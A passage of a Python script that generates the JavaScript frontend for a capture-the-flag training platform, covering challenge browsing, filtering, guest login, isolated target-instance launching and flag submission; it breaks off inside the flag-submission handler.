import json
from pathlib import Path

ROOT_DIR = Path(__file__).resolve().parent.parent
FRONTEND_DIR = ROOT_DIR / "frontend"
CATALOG_FILE = ROOT_DIR / "challenges_catalog.json"

challenges = json.load(open(CATALOG_FILE, "r", encoding="utf-8"))
challenges_json = json.dumps(challenges, indent=2)

app_js_content = f'''/* ==========================================================================
   INTERSECT — CTF Platform & Mission Range
   Vanilla JS, no build step — served alongside the API.
   ========================================================================== */

// ---------------------------------------------------------------------------
// Config & API Connection
// ---------------------------------------------------------------------------

const API_BASE = window.CTF_API_BASE || 
  (window.location.port === '8080' ? 'http://localhost:8000' : (window.location.origin.startsWith('http') ? window.location.origin : 'http://localhost:8000'));

// Embedded 101 Challenge Catalog (instant 0ms render + offline fallback)
const EMBEDDED_CHALLENGES = {challenges_json};

// ---------------------------------------------------------------------------
// Icons (clean inline SVGs)
// ---------------------------------------------------------------------------

const ICON = {{
  dashboard: '<svg class="icon" viewBox="0 0 16 16" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.4"><rect x="1.5" y="1.5" width="6" height="6" rx="1"/><rect x="8.5" y="1.5" width="6" height="4" rx="1"/><rect x="8.5" y="7.5" width="6" height="7" rx="1"/><rect x="1.5" y="9.5" width="6" height="5" rx="1"/></svg>',
  cases: '<svg class="icon" viewBox="0 0 16 16" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.4"><path d="M1.5 5.5h13v7.2a1 1 0 0 1-1 1h-11a1 1 0 0 1-1-1z"/><path d="M5 5.5V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v1.5"/></svg>',
  board: '<svg class="icon" viewBox="0 0 16 16" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.4"><path d="M4 14V7M8 14V2M12 14v4.5"/><path d="M1.5 14.5h13"/></svg>',
  profile: '<svg class="icon" viewBox="0 0 16 16" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.4"><circle cx="8" cy="5" r="2.6"/><path d="M2.5 14c.8-3 3-4.5 5.5-4.5s4.7 1.5 5.5 4.5"/></svg>',
  search: '<svg class="icon" viewBox="0 0 16 16" width="14" height="14" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="7" cy="7" r="4.5"/><path d="M13 13l-2.5-2.5"/></svg>',
  logout: '<svg class="icon" viewBox="0 0 16 16" width="14" height="14" fill="none" stroke="currentColor" stroke-width="1.4"><path d="M6 14H3a1 1 0 0 1-1-1V3a1 1 0 0 1 1-1h3"/><path d="M10.5 11.5L14 8l-3.5-3.5"/><path d="M14 8H6"/></svg>',
  login: '<svg class="icon" viewBox="0 0 16 16" width="14" height="14" fill="none" stroke="currentColor" stroke-width="1.4"><path d="M10 14h3a1 1 0 0 0 1-1V3a1 1 0 0 0-1-1h-3"/><path d="M5.5 11.5L2 8l3.5-3.5"/><path d="M2 8h8"/></svg>',
  copy: '<svg class="icon" viewBox="0 0 16 16" width="13" height="13" fill="none" stroke="currentColor" stroke-width="1.4"><rect x="5.5" y="5.5" width="8.5" height="8.5" rx="1"/><path d="M10.5 5.5V2.5a1 1 0 0 0-1-1H2.5a1 1 0 0 0-1 1V10a1 1 0 0 0 1 1h3"/></svg>',
  docs: '<svg class="icon" viewBox="0 0 16 16" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.4"><path d="M2.5 2.5h8.5a1.5 1.5 0 0 1 1.5 1.5v9.5H2.5a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1z"/><path d="M4.5 5.5h6M4.5 8.5h6M4.5 11.5h3.5"/></svg>',
  bolt: '<svg class="icon" viewBox="0 0 16 16" width="14" height="14" fill="currentColor"><path d="M9.5 1L2 9.5h5L5.5 15 14 6.5H9z"/></svg>',
  check: '<svg class="icon" viewBox="0 0 16 16" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><path d="M2.5 8.5l3.5 3.5 7.5-7.5"/></svg>',
  filter: '<svg class="icon" viewBox="0 0 16 16" width="14" height="14" fill="none" stroke="currentColor" stroke-width="1.4"><path d="M1.5 2.5h13l-5 6v5l-3-2v-3z"/></svg>',
}};

// ---------------------------------------------------------------------------
// Category Metadata (Names, Colors, Labels)
// ---------------------------------------------------------------------------

const CATEGORY_META = {{
  all: {{ label: 'All Problems', color: '#ffb300' }},
  web: {{ label: 'Web Exploitation', color: '#38bdf8' }},
  crypto: {{ label: 'Cryptography', color: '#fbbf24' }},
  rev: {{ label: 'Reverse Engineering', color: '#a78bfa' }},
  forensics: {{ label: 'Forensics & Incident', color: '#34d399' }},
  pwn: {{ label: 'Binary Exploit (Pwn)', color: '#f87171' }},
  misc: {{ label: 'Misc & Sandbox', color: '#f472b6' }},
  osint: {{ label: 'OSINT & Recon', color: '#818cf8' }},
}};

// ---------------------------------------------------------------------------
// Application State
// ---------------------------------------------------------------------------

const state = {{
  token: localStorage.getItem('intersect_token') || null,
  username: localStorage.getItem('intersect_username') || null,
  email: localStorage.getItem('intersect_email') || null,
  isGuest: !localStorage.getItem('intersect_token'),
  view: 'challenges', // Default to challenges so all 100 problems are visible instantly
  challenges: EMBEDDED_CHALLENGES,
  scoreboard: null,
  myInstances: [],
  submissions: [],
  profile: null,
  filters: {{ category: 'all', difficulty: 'all', search: '' }},
  activeModalChallenge: null,
  activeDocTopic: 'ctf101',
  docSearch: '',
  countdownTimer: null,
  authModalOpen: false,
  authModalTab: 'login',
}};

function solvedKey() {{
  return `intersect_solved_${{state.username || 'anon'}}`;
}}

function getSolvedSet() {{
  try {{
    return new Set(JSON.parse(localStorage.getItem(solvedKey()) || '[]'));
  }} catch {{
    return new Set();
  }}
}}

function markSolved(challengeId) {{
  const s = getSolvedSet();
  s.add(challengeId);
  localStorage.setItem(solvedKey(), JSON.stringify([...s]));
}}

// ---------------------------------------------------------------------------
// Toast Notifications
// ---------------------------------------------------------------------------

function toast(message, kind = 'info') {{
  const stack = document.getElementById('toast-stack');
  if (!stack) return;
  const el = document.createElement('div');
  el.className = `toast ${{kind === 'error' ? 'error' : kind === 'success' ? 'success' : ''}}`;
  el.textContent = message;
  stack.appendChild(el);
  setTimeout(() => {{
    el.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
    el.style.opacity = '0';
    el.style.transform = 'translateY(-10px)';
    setTimeout(() => el.remove(), 300);
  }}, 4000);
}}

// ---------------------------------------------------------------------------
// API Client
// ---------------------------------------------------------------------------

async function apiRequest(path, {{ method = 'GET', body = null, form = false, auth = true }} = {{}}) {{
  const headers = {{}};
  if (auth && state.token) headers['Authorization'] = `Bearer ${{state.token}}`;
  if (body && !form) headers['Content-Type'] = 'application/json';

  let res;
  try {{
    res = await fetch(`${{API_BASE}}${{path}}`, {{
      method,
      headers,
      body: form ? body : body ? JSON.stringify(body) : undefined,
    }});
  }} catch (err) {{
    console.warn(`API unreachable at ${{API_BASE}}${{path}}, using embedded state if available.`);
    throw new Error('Could not reach CTF API server. Please ensure backend is running.');
  }}

  if (res.status === 401 && auth) {{
    handleSessionExpired();
    throw new Error('Session expired');
  }}

  let data = null;
  const text = await res.text();
  if (text) {{
    try {{ data = JSON.parse(text); }} catch {{ data = null; }}
  }}

  if (!res.ok) {{
    const detail = (data && data.detail) ? data.detail : `Request failed (${{res.status}})`;
    throw new Error(typeof detail === 'string' ? detail : 'Request failed');
  }}

  return data;
}}

const api = {{
  register: (username, email, password) =>
    apiRequest('/auth/register', {{ method: 'POST', body: {{ username, email, password }}, auth: false }}),

  login: (username, password) => {{
    const form = new URLSearchParams();
    form.set('username', username);
    form.set('password', password);
    return apiRequest('/auth/login', {{ method: 'POST', body: form, form: true, auth: false }});
  }},

  profile: () => apiRequest('/auth/me'),
  challenges: () => apiRequest('/challenges/', {{ auth: false }}),
  scoreboard: () => apiRequest('/scoreboard/', {{ auth: false }}),
  myInstances: () => apiRequest('/instances/mine'),
  mySubmissions: () => apiRequest('/submissions/mine'),
  startInstance: (challengeId) => apiRequest(`/instances/${{challengeId}}/start`, {{ method: 'POST' }}),
  stopInstance: (instanceId) => apiRequest(`/instances/${{instanceId}}/stop`, {{ method: 'POST' }}),
  submitFlag: (challengeId, flag) => apiRequest('/submissions/', {{ method: 'POST', body: {{ challenge_id: challengeId, flag }} }}),
}};

// ---------------------------------------------------------------------------
// Authentication & Session
// ---------------------------------------------------------------------------

function handleSessionExpired() {{
  state.token = null;
  state.isGuest = true;
  localStorage.removeItem('intersect_token');
  toast('Session expired — operating in guest mode.', 'error');
  renderShell();
}}

function persistSession(token, username, email) {{
  state.token = token;
  state.username = username;
  state.isGuest = false;
  if (email) state.email = email;
  localStorage.setItem('intersect_token', token);
  localStorage.setItem('intersect_username', username);
  if (email) localStorage.setItem('intersect_email', email);
}}

function logout() {{
  state.token = null;
  state.username = null;
  state.email = null;
  state.isGuest = true;
  localStorage.removeItem('intersect_token');
  localStorage.removeItem('intersect_username');
  localStorage.removeItem('intersect_email');
  state.myInstances = [];
  toast('Signed out. Switched to public guest mode.', 'info');
  bootApp();
}}

async function ensureUserSession() {{
  if (state.token && state.username) return true;
  // Seamless guest auto-creation
  const guestUser = 'Agent_' + Math.floor(1000 + Math.random() * 9000);
  const guestEmail = `${{guestUser.toLowerCase()}}@ctf-range.com`;
  const guestPass = 'GuestPass123!';
  try {{
    try {{
      await api.register(guestUser, guestEmail, guestPass);
    }} catch {{
      // Ignore if user exists
    }}
    const data = await api.login(guestUser, guestPass);
    persistSession(data.access_token, guestUser, guestEmail);
    toast(`Temporary clearance granted: ${{guestUser}}`, 'success');
    await bootApp();
    return true;
  }} catch (err) {{
    openAuthModal('login');
    return false;
  }}
}}

// ---------------------------------------------------------------------------
// Application Shell
// ---------------------------------------------------------------------------

function renderShell() {{
  const root = document.getElementById('root');
  const userDisplay = state.username ? escapeHtml(state.username) : 'Guest Operative';
  const userInitials = state.username ? state.username.slice(0, 2).toUpperCase() : 'GO';
  const isGuest = !state.token;

  root.innerHTML = `
    <div class="shell">
      <aside class="sidebar">
        <div class="sidebar-brand">
          <div class="mark"><span class="dot"></span> INTERSECT</div>
          <div class="tagline">100+ CYBER CASE-FILE RANGE</div>
        </div>
        <nav class="nav-group">
          ${{navItemHtml('challenges', ICON.cases, 'Challenges / Range', (state.challenges || []).length)}}
          ${{navItemHtml('dashboard', ICON.dashboard, 'Mission Hub')}}
          ${{navItemHtml('docs', ICON.docs, 'Field Manual (Docs)')}}
          ${{navItemHtml('scoreboard', ICON.board, 'Scoreboard')}}
          ${{navItemHtml('profile', ICON.profile, isGuest ? 'Profile (Guest)' : 'Profile')}}
        </nav>
        <div class="sidebar-foot">
          <div class="sidebar-user">
            <div class="avatar ${{isGuest ? 'guest' : ''}}">${{userInitials}}</div>
            <div class="who">
              <div class="name">${{userDisplay}}</div>
              <div class="status">
                <span class="dot ${{isGuest ? 'yellow' : ''}}"></span> 
                ${{isGuest ? 'guest mode' : 'clearance active'}}
              </div>
            </div>
          </div>
          ${{isGuest ? `
            <button class="btn btn-primary btn-sm btn-block" id="sidebar-auth-btn">${{ICON.bolt}} Sign In / Register</button>
          ` : `
            <button class="btn btn-ghost btn-sm btn-block" id="logout-btn">${{ICON.logout}} Sign out</button>
          `}}
        </div>
      </aside>

      <div class="main">
        <div class="topbar">
          <div class="topbar-search">
            <span class="icon">${{ICON.search}}</span>
            <input id="global-search" placeholder="Search 100+ challenges, vulnerabilities, categories…" value="${{escapeHtml(state.filters.search)}}">
            ${{state.filters.search ? '<button id="clear-search-btn" class="clear-btn">&times;</button>' : ''}}
          </div>
          <div class="topbar-spacer"></div>
          <div class="topbar-actions">
            <div class="topbar-stat" id="topbar-challenges-count">
              <b>${{(state.challenges || []).length}}</b> challenges loaded
            </div>
            <div class="topbar-stat" id="topbar-instances">
              <b>${{state.myInstances.filter(i => i.status === 'running').length}}</b> instance(s) live
            </div>
            ${{isGuest ? `
              <button class="btn btn-primary btn-sm" id="topbar-auth-btn">${{ICON.login}} Sign In</button>
            ` : `
              <div class="topbar-user-badge">Operative: <b>${{escapeHtml(state.username)}}</b></div>
            `}}
          </div>
        </div>
        <div class="content" id="content"></div>
      </div>
    </div>
  `;

  if (document.getElementById('logout-btn')) {{
    document.getElementById('logout-btn').addEventListener('click', logout);
  }}
  if (document.getElementById('sidebar-auth-btn')) {{
    document.getElementById('sidebar-auth-btn').addEventListener('click', () => openAuthModal('login'));
  }}
  if (document.getElementById('topbar-auth-btn')) {{
    document.getElementById('topbar-auth-btn').addEventListener('click', () => openAuthModal('login'));
  }}

  document.querySelectorAll('.nav-item').forEach(el => {{
    el.addEventListener('click', () => navigate(el.dataset.view));
  }});

  const searchInput = document.getElementById('global-search');
  if (searchInput) {{
    searchInput.addEventListener('input', debounce((e) => {{
      state.filters.search = e.target.value;
      if (state.view === 'challenges') renderChallengesView();
      else {{
        navigate('challenges');
      }}
    }}, 150));
  }}

  const clearSearchBtn = document.getElementById('clear-search-btn');
  if (clearSearchBtn) {{
    clearSearchBtn.addEventListener('click', () => {{
      state.filters.search = '';
      if (searchInput) searchInput.value = '';
      renderChallengesView();
    }});
  }}

  refreshInstanceBadge();
}}

function navItemHtml(view, icon, label, badgeCount) {{
  const active = state.view === view ? 'active' : '';
  const badge = badgeCount ? `<span class="nav-badge">${{badgeCount}}</span>` : '';
  return `<button class="nav-item ${{active}}" data-view="${{view}}">${{icon}}<span>${{label}}</span>${{badge}}</button>`;
}}

function navigate(view) {{
  state.view = view;
  document.querySelectorAll('.nav-item').forEach(el => {{
    el.classList.toggle('active', el.dataset.view === view);
  }});
  renderContent();
}}

function renderContent() {{
  const content = document.getElementById('content');
  if (!content) return;
  if (state.view === 'challenges') return renderChallengesView();
  if (state.view === 'dashboard') return renderDashboardView();
  if (state.view === 'docs') return renderDocsView();
  if (state.view === 'scoreboard') return renderScoreboardView();
  if (state.view === 'profile') return renderProfileView();
}}

// ---------------------------------------------------------------------------
// Boot & Loaders
// ---------------------------------------------------------------------------

async function bootApp() {{
  renderShell();
  renderContent();

  await Promise.allSettled([
    loadChallenges(),
    loadScoreboard(),
    loadMyInstances(),
    loadMyProfile(),
    loadMySubmissions(),
  ]);

  renderShell();
  renderContent();
}}

async function loadChallenges() {{
  try {{
    const data = await api.challenges();
    if (Array.isArray(data) && data.length > 0) {{
      // Merge difficulty/details if API doesn't have them
      const metaMap = new Map(EMBEDDED_CHALLENGES.map(c => [c.slug, c]));
      state.challenges = data.map(c => {{
        const meta = metaMap.get(c.slug) || {{}};
        return {{
          ...c,
          difficulty: c.difficulty || meta.difficulty || (c.points <= 125 ? 'Easy' : c.points <= 220 ? 'Medium' : 'Hard'),
          details: c.details || meta.details || 'Inspect the target parameters and environment to recover the flag.',
        }};
      }});
    }} else {{
      state.challenges = EMBEDDED_CHALLENGES;
    }}
  }} catch (err) {{
    state.challenges = EMBEDDED_CHALLENGES;
  }}
}}

async function loadScoreboard() {{
  try {{
    state.scoreboard = await api.scoreboard();
  }} catch (err) {{
    state.scoreboard = [];
  }}
}}

async function loadMyInstances() {{
  if (!state.token) {{
    state.myInstances = [];
    refreshInstanceBadge();
    return;
  }}
  try {{
    state.myInstances = await api.myInstances();
  }} catch (err) {{
    state.myInstances = [];
  }}
  refreshInstanceBadge();
}}

async function loadMyProfile() {{
  if (!state.token) return;
  try {{
    state.profile = await api.profile();
    if (state.profile && Array.isArray(state.profile.solved_challenge_ids)) {{
      state.profile.solved_challenge_ids.forEach(cid => markSolved(cid));
    }}
  }} catch (err) {{
    state.profile = null;
  }}
}}

async function loadMySubmissions() {{
  if (!state.token) {{
    state.submissions = [];
    return;
  }}
  try {{
    state.submissions = await api.mySubmissions();
  }} catch (err) {{
    state.submissions = [];
  }}
}}

function refreshInstanceBadge() {{
  const badge = document.getElementById('topbar-instances');
  if (badge) {{
    const n = state.myInstances.filter(i => i.status === 'running').length;
    badge.innerHTML = `<b>${{n}}</b>&nbsp;instance${{n === 1 ? '' : 's'}} live`;
  }}
}}

// ---------------------------------------------------------------------------
// Render: Challenges (100 Problems Range)
// ---------------------------------------------------------------------------

function renderChallengesView() {{
  const content = document.getElementById('content');
  const allChallenges = state.challenges || EMBEDDED_CHALLENGES;
  
  // Categories
  const categoryKeys = ['all', 'web', 'crypto', 'rev', 'forensics', 'pwn', 'misc', 'osint'];
  
  const getCategoryCount = (cat) => {{
    if (cat === 'all') return allChallenges.length;
    return allChallenges.filter(c => c.category === cat).length;
  }};

  const solvedSet = getSolvedSet();

  const filtered = allChallenges.filter(c => {{
    const matchesCat = state.filters.category === 'all' || c.category === state.filters.category;
    const matchesDiff = state.filters.difficulty === 'all' || (c.difficulty && c.difficulty.toLowerCase() === state.filters.difficulty.toLowerCase());
    const q = (state.filters.search || '').trim().toLowerCase();
    const matchesSearch = !q || 
      c.name.toLowerCase().includes(q) || 
      c.description.toLowerCase().includes(q) || 
      c.category.toLowerCase().includes(q) ||
      (c.difficulty && c.difficulty.toLowerCase().includes(q)) ||
      (c.slug && c.slug.toLowerCase().includes(q));
    return matchesCat && matchesDiff && matchesSearch;
  }});

  const solvedCount = allChallenges.filter(c => solvedSet.has(c.id)).length;

  content.innerHTML = `
    <div class="page-head">
      <div class="page-head-bar">
        <div>
          <h1>100 CTF Problem Collection</h1>
          <p>Full spectrum cyber-range with 100+ challenges. Click any case file to view briefing and launch isolated target machines.</p>
        </div>
        <div class="page-head-stats">
          <div class="stat-pill">
            <span class="label">Total Challenges</span>
            <span class="value accent">${{allChallenges.length}}</span>
          </div>
          <div class="stat-pill">
            <span class="label">Cases Cleared</span>
            <span class="value ok">${{solvedCount}} / ${{allChallenges.length}}</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Category Filter Bar -->
    <div class="filter-toolbar">
      <div class="chip-row" id="category-chips">
        ${{categoryKeys.map(cat => {{
          const meta = CATEGORY_META[cat] || {{ label: cat.toUpperCase(), color: '#ffb300' }};
          const count = getCategoryCount(cat);
          const active = state.filters.category === cat ? 'active' : '';
          return `
            <button class="chip ${{active}}" data-cat="${{cat}}">
              <span class="dot" style="background:${{meta.color}}"></span>
              ${{meta.label}}
              <span class="chip-count">(${{count}})</span>
            </button>
          `;
        }}).join('')}}
      </div>

      <!-- Difficulty Filter -->
      <div class="difficulty-row">
        <span class="filter-label">${{ICON.filter}} Difficulty:</span>
        ${{['all', 'easy', 'medium', 'hard'].map(d => `
          <button class="diff-btn ${{state.filters.difficulty === d ? 'active' : ''}}" data-diff="${{d}}">
            ${{d.toUpperCase()}}
          </button>
        `).join('')}}
      </div>
    </div>

    <!-- Live Counter Banner -->
    <div class="results-header">
      <div class="results-count">
        Displaying <b>${{filtered.length}}</b> of <b>${{allChallenges.length}}</b> case files
        ${{state.filters.category !== 'all' ? `in <i>${{CATEGORY_META[state.filters.category]?.label || state.filters.category}}</i>` : ''}}
        ${{state.filters.difficulty !== 'all' ? `[${{state.filters.difficulty.toUpperCase()}}]` : ''}}
        ${{state.filters.search ? `matching "${{escapeHtml(state.filters.search)}}"` : ''}}
      </div>
      ${{(state.filters.category !== 'all' || state.filters.difficulty !== 'all' || state.filters.search) ? `
        <button class="btn btn-ghost btn-sm" id="reset-filters-btn">Reset Filters</button>
      ` : ''}}
    </div>

    <!-- Challenges Grid -->
    <div class="case-grid" id="case-grid"></div>
  `;

  // Handlers for category chips
  document.querySelectorAll('#category-chips .chip').forEach(chip => {{
    chip.addEventListener('click', () => {{
      state.filters.category = chip.dataset.cat;
      renderChallengesView();
    }});
  }});

  // Handlers for difficulty buttons
  document.querySelectorAll('.diff-btn').forEach(btn => {{
    btn.addEventListener('click', () => {{
      state.filters.difficulty = btn.dataset.diff;
      renderChallengesView();
    }});
  }});

  if (document.getElementById('reset-filters-btn')) {{
    document.getElementById('reset-filters-btn').addEventListener('click', () => {{
      state.filters.category = 'all';
      state.filters.difficulty = 'all';
      state.filters.search = '';
      const s = document.getElementById('global-search');
      if (s) s.value = '';
      renderChallengesView();
    }});
  }}

  const grid = document.getElementById('case-grid');
  if (filtered.length === 0) {{
    grid.innerHTML = emptyStateHtml('No matching challenges found.', 'Try adjusting your search keywords or switching category filters.');
    return;
  }}

  grid.innerHTML = filtered.map(caseCardHtml).join('');
  attachCaseCardHandlers(grid);
}}

function caseCardHtml(c) {{
  const solved = getSolvedSet().has(c.id);
  const running = state.myInstances.some(i => i.challenge_id === c.id && i.status === 'running');
  let stampClass = 'locked', stampLabel = 'UNOPENED';
  if (solved) {{ stampClass = 'cleared'; stampLabel = 'CLEARED ✓'; }}
  else if (running) {{ stampClass = 'active'; stampLabel = 'RUNNING ⚡'; }}

  const catMeta = CATEGORY_META[c.category] || {{ label: c.category.toUpperCase(), color: '#38bdf8' }};
  const diff = c.difficulty || (c.points <= 125 ? 'Easy' : c.points <= 220 ? 'Medium' : 'Hard');
  const diffClass = diff.toLowerCase();

  return `
    <div class="case-card ${{solved ? 'solved' : ''}} ${{running ? 'running-card' : ''}}" tabindex="0" role="button" data-open-case="${{c.id}}">
      <div class="card-top">
        <span class="cat-badge" style="border-color:${{catMeta.color}}44; color:${{catMeta.color}}; background:${{catMeta.color}}15;">
          ${{c.category.toUpperCase()}}
        </span>
        <span class="diff-badge ${{diffClass}}">${{diff}}</span>
        <div class="stamp ${{stampClass}}">${{stampLabel}}</div>
      </div>
      
      <div class="file-no mono">CASE #${{shortId(c.id)}}</div>
      <div class="file-name">${{escapeHtml(c.name)}}</div>
      <div class="file-desc">${{escapeHtml(c.description)}}</div>
      
      <div class="file-foot">
        <span class="points-pill">${{c.points}} PTS</span>
        <span class="solves-pill mono">${{c.solves_count || 0}} solves</span>
        <span class="open-action">Open Briefing →</span>
      </div>
    </div>
  `;
}}

function attachCaseCardHandlers(host) {{
  host.querySelectorAll('[data-open-case]').forEach(card => {{
    const open = () => openChallengeModal(card.dataset.openCase);
    card.addEventListener('click', open);
    card.addEventListener('keydown', (e) => {{ if (e.key === 'Enter' || e.key === ' ') {{ e.preventDefault(); open(); }} }});
  }});
}}

function shortId(id) {{
  if (!id) return '000000';
  return id.replace(/-/g, '').slice(0, 6).toUpperCase();
}}

// ---------------------------------------------------------------------------
// Challenge Detail & Instance Modal
// ---------------------------------------------------------------------------

function openChallengeModal(challengeId) {{
  const allChallenges = state.challenges || EMBEDDED_CHALLENGES;
  const challenge = allChallenges.find(c => c.id === challengeId);
  if (!challenge) return;
  state.activeModalChallenge = challenge;

  const existingInstance = state.myInstances.find(i => i.challenge_id === challengeId && i.status === 'running');
  const solved = getSolvedSet().has(challengeId);
  const catMeta = CATEGORY_META[challenge.category] || {{ label: challenge.category.toUpperCase(), color: '#38bdf8' }};
  const diff = challenge.difficulty || (challenge.points <= 125 ? 'Easy' : challenge.points <= 220 ? 'Medium' : 'Hard');

  const modalRoot = document.getElementById('modal-root');
  modalRoot.innerHTML = `
    <div class="modal-backdrop" id="modal-backdrop">
      <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modal-title">
        <button class="modal-close" id="modal-close" aria-label="Close">&times;</button>
        
        <div class="modal-head">
          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
            <div class="file-no mono">CASE FILE #${{shortId(challenge.id)}} // ${{challenge.slug}}</div>
            <div style="display:flex; gap:6px;">
              <span class="cat-badge" style="border-color:${{catMeta.color}}44; color:${{catMeta.color}}; background:${{catMeta.color}}15;">
                ${{challenge.category.toUpperCase()}}
              </span>
              <span class="diff-badge ${{diff.toLowerCase()}}">${{diff}}</span>
            </div>
          </div>
          <h2 id="modal-title">${{escapeHtml(challenge.name)}}</h2>
          <div class="modal-meta">
            <span class="points-pill">${{challenge.points}} PTS</span>
            <span class="solves-pill mono">${{challenge.solves_count || 0}} Solves</span>
            ${{solved ? '<span class="status-pill cleared">✓ CLEARED</span>' : '<span class="status-pill uncompleted">UNSOLVED</span>'}}
          </div>
        </div>

        <div class="modal-body-section">
          <h3>Mission Briefing</h3>
          <p class="desc-text">${{escapeHtml(challenge.description)}}</p>
        </div>

        <div class="divider"></div>

        <!-- Target Machine Area -->
        <div class="modal-body-section">
          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
            <h3>Isolated Target Machine</h3>
            <span class="mono text-muted" style="font-size:11px;">Unique Flag per Instance</span>
          </div>
          <div id="instance-area"></div>
        </div>

        <div class="divider"></div>

        <!-- Flag Submission -->
        <div class="modal-body-section">
          <div class="field" style="margin-bottom:8px">
            <label for="flag-input">Submit Flag Proof</label>
            <div class="flag-row">
              <input id="flag-input" placeholder="CTF{{...}}" autocomplete="off" ${{solved ? 'value="[FLAG SUBMITTED & VERIFIED]" disabled' : ''}}>
              <button class="btn btn-primary" id="submit-flag-btn" ${{solved ? 'disabled' : ''}}>
                ${{solved ? '✓ Solved' : 'Submit Flag'}}
              </button>
            </div>
          </div>
          <div id="submit-result" class="submit-result"></div>
        </div>

        <!-- Field Tip / Details -->
        ${{challenge.details ? `
          <div class="tip-box">
            <strong>💡 FIELD OPERATOR TIP:</strong> ${{escapeHtml(challenge.details)}}
          </div>
        ` : ''}}
      </div>
    </div>
  `;

  document.getElementById('modal-close').addEventListener('click', closeModal);
  document.getElementById('modal-backdrop').addEventListener('click', (e) => {{
    if (e.target.id === 'modal-backdrop') closeModal();
  }});
  document.addEventListener('keydown', onModalKeydown);

  const submitBtn = document.getElementById('submit-flag-btn');
  if (submitBtn && !solved) {{
    submitBtn.addEventListener('click', onSubmitFlag);
  }}
  const flagInput = document.getElementById('flag-input');
  if (flagInput && !solved) {{
    flagInput.addEventListener('keydown', (e) => {{
      if (e.key === 'Enter') onSubmitFlag();
    }});
  }}

  renderInstanceArea(existingInstance || null);
}}

function onModalKeydown(e) {{
  if (e.key === 'Escape') closeModal();
}}

function closeModal() {{
  document.getElementById('modal-root').innerHTML = '';
  document.removeEventListener('keydown', onModalKeydown);
  stopCountdown();
  state.activeModalChallenge = null;
}}

function renderInstanceArea(instance) {{
  const area = document.getElementById('instance-area');
  if (!area) return;

  if (!instance) {{
    area.innerHTML = `
      <div class="instance-start-box">
        <p style="margin-bottom:12px; font-size:13.5px; color:var(--paper-dim);">
          Launch a dedicated instance sandbox on the CTF network. A personalized session flag will be generated and injected.
        </p>
        <button class="btn btn-primary btn-block" id="start-instance-btn">
          ${{ICON.bolt}} Spawn Isolated Target Machine
        </button>
      </div>
    `;
    document.getElementById('start-instance-btn').addEventListener('click', onStartInstance);
    return;
  }}

  const targetHost = instance.connect_info || `localhost:${{instance.host_port}}`;
  const webUrl = targetHost.startsWith('http') ? targetHost : `http://${{targetHost}}`;

  area.innerHTML = `
    <div class="instance-live-box">
      <div class="connect-box">
        <div>
          <span class="live-dot"></span>
          <code>${{escapeHtml(targetHost)}}</code>
        </div>
        <div style="display:flex; gap:6px; align-items:center;">
          <a href="${{webUrl}}" target="_blank" rel="noopener noreferrer" class="btn btn-primary btn-sm" style="text-decoration:none;">
            Launch Web App ↗
          </a>
          <button class="btn btn-ghost btn-sm" id="copy-connect-btn" title="Copy endpoint">
            ${{ICON.copy}} Copy
          </button>
        </div>
      </div>
      <div class="expiry-note" id="expiry-note"></div>
      <button class="btn btn-danger btn-sm btn-block" id="stop-instance-btn">Stop Target Machine</button>
    </div>
  `;

  document.getElementById('copy-connect-btn').addEventListener('click', () => {{
    navigator.clipboard.writeText(targetHost).then(() => toast('Copied target endpoint to clipboard.', 'success'));
  }});
  document.getElementById('stop-instance-btn').addEventListener('click', () => onStopInstance(instance.id));

  startCountdown(instance.expires_at);
}}

async function onStartInstance() {{
  const challenge = state.activeModalChallenge;
  const area = document.getElementById('instance-area');
  
  if (!state.token) {{
    const hasSession = await ensureUserSession();
    if (!hasSession) return;
  }}

  const bootLines = [
    'allocating isolated container sandbox…',
    'binding dynamic network port…',
    'generating cryptographic session flag…',
    'injecting environment parameters…',
    'target service online — HTTP ready.',
  ];

  area.innerHTML = `<div class="terminal" id="boot-terminal"></div>`;
  const term = document.getElementById('boot-terminal');

  for (let i = 0; i < bootLines.length; i++) {{
    const lineEl = document.createElement('div');
    lineEl.className = 'line';
    lineEl.textContent = `$ ${{bootLines[i]}}`;
    term.appendChild(lineEl);
    await sleep(prefersReducedMotion() ? 0 : 200);
  }}

  try {{
    const instance = await api.startInstance(challenge.id);
    const okLine = document.createElement('div');
    okLine.className = 'line ok';
    okLine.innerHTML = `$ ready — instance online <span class="cursor"></span>`;
    term.appendChild(okLine);
    await sleep(prefersReducedMotion() ? 0 : 250);

    await loadMyInstances();
    renderInstanceArea(instance);
    toast('Challenge machine launched successfully!', 'success');
  }} catch (err) {{
    area.innerHTML = `
      <div style="padding:12px; border:1px solid var(--alert); border-radius:4px; margin-bottom:10px;">
        <p style="color:var(--alert); margin:0 0 8px 0; font-size:13px;">${{escapeHtml(err.message)}}</p>
        <button class="btn btn-primary btn-sm" id="retry-start-btn">Retry Machine Start</button>
      </div>
    `;
    document.getElementById('retry-start-btn').addEventListener('click', onStartInstance);
    toast(err.message, 'error');
  }}
}}

async function onStopInstance(instanceId) {{
  try {{
    await api.stopInstance(instanceId);
    await loadMyInstances();
    renderInstanceArea(null);
    toast('Target machine stopped.', 'info');
  }} catch (err) {{
    toast(err.message, 'error');
  }}
}}

async function onSubmitFlag() {{
  const challenge = state.activeModalChallenge;
  const input = document.getElementById('flag-input');
  const btn = document.getElementById('submit-flag-btn');
  const resultEl = document.getElementById('submit-result');
  const flag = input.value.trim();
  if (!flag) return;

  if (!state.token) {{
    const hasSession = await ensureUserSession();
    if (!hasSession) return;
  }}

  btn.disabled = true;
  btn.textContent = 'Verifying…';
  try {{
    const result = await api.submitFlag(challenge.id, flag);
    resultEl.className = `submit-result show ${{result.correct ? 'correct' : 'incorrect'}}`;
    resultEl.textContent = result.message;

    if (result.correct) {{
      markSolved(challenge.id);
      input.disabled = true;
      btn.disabled = true;
      btn.textContent = '✓ Solved';
